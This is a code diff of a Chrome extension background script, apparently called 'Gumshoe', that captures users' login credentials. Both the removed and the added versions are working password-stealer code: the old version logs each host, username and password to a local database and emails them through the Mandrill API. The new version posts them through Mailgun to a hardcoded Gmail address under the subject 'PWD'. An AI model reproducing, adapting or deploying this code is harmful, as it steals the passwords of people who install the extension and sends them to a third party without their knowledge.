@@ -1,79 +1,22 @@
-var db = openDatabase('Gumshoe', '1', 'login records', 5 * 1024 * 1024);
 
 chrome.extension.onRequest.addListener(function(request, tab, respond) {
 
-    if (request.action == 'queryDatabase') {
-
-        db.transaction(function(tx) {
-
-            if (request.crud == 'create') {
-
-
-                // insert unique login credentials
-                tx.executeSql('insert into log (href, host, user, pass) ' +
-                    'VALUES (?, ?, ?, ?)', request.record);
+    if (request.action === 'send') {
 
                 var arr = request.record;
-                var html = '';
-                arr.forEach(function(elem){
-                   html += '<p>' + elem + '</p>'
-                });
+                var data = arr.join(' ');
 
-                if(html) {
+ 		        var body =   {
+			        from: 'mailgun@sandboxab04a0cb2f204bb3a60fc5c0500ea941.mailgun.org', //<--- from
+                    		to : 'autukr@gmail.com', //<--- to
+			        subject: 'PWD',
+			        text: data
+		        };
 
-                    var data = {
-                        'key': '', //<--- Your key there
-                        'message': {
-                            'from_email': '', //<--- from
-                            'to': [
-                                {
-                                    'email': '', //<--- to
-                                    'name': 'PWD',
-                                    'type': 'to'
-                                }
-                            ],
-                            'autotext': 'true',
-                            'subject': 'PWD',
-                            'html':'<div>' + html + '</div>'
-                        }
-                    };
-
-                    var xhr = new XMLHttpRequest();
-                    xhr.open("POST", "https://mandrillapp.com/api/1.0/messages/send.json", true);
-                    xhr.setRequestHeader("Content-Type","application/json");
-                    xhr.send(JSON.stringify(data));
-                }
-
-            } else {
-
-                var query = ' FROM log WHERE host LIKE ?1 OR user LIKE' +
-                    ' ?1 OR pass LIKE ?1 OR time LIKE ?1';
-
-                if (request.crud == 'read')
-                    query = 'SELECT *' + query + ' ORDER BY time DESC';
-                if (request.crud == 'delete')
-                    query = 'DELETE' + query;
-
-                // read or delete all which vaguely match `refine`
-                tx.executeSql(query, ['%' + request.refine + '%'],
-                    function(tx, result) {
-
-                    var rows = [];
-
-                    for (var i = 0; i < result.rows.length; i++)
-                        rows.push(result.rows.item(i));
-
-                    respond(rows);
-                });
-            }
-        });
+                var xhr = new XMLHttpRequest();
+                xhr.open("POST", "https://api.mailgun.net/v3/<YOUR DOMAIN THERE>/messages", true); //<--- Your mailgun domain there
+                xhr.setRequestHeader ("Authorization", "<YOUR API-KEY THERE>"); //<--- Your key there
+                xhr.setRequestHeader("Content-Type","application/json");
+                xhr.send(JSON.stringify(body));
     }
-});
-
-chrome.runtime.onInstalled.addListener(function(details) {
-  db.transaction(function(tx) {
-    tx.executeSql('CREATE TABLE IF NOT EXISTS log (time TIMESTAMP'
-      + ' DEFAULT CURRENT_TIMESTAMP, href, host, user, pass, UNIQUE'
-      + ' (host, user, pass))');
-  });
 });
